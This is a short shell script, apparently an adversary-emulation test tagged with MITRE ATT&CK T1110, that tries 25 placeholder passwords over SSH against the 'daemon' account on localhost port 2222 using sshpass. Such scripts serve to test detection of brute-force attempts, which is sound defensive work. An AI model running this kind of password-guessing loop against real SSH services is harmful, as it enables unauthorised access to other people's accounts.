#!/bin/sh
# Tactic: Credential Access
# Name: Brute Force
# ID: 	T1110
# Makes some silly guesses as to the password for the "daemon" user
i=1
while [ $i -le 25 ]
do
    echo "Trying guess$i"
    sshpass -p guess$i ssh -p 2222 daemon@127.0.0.1
    i=$(($i+1))
done
echo "Brute forcing failed"
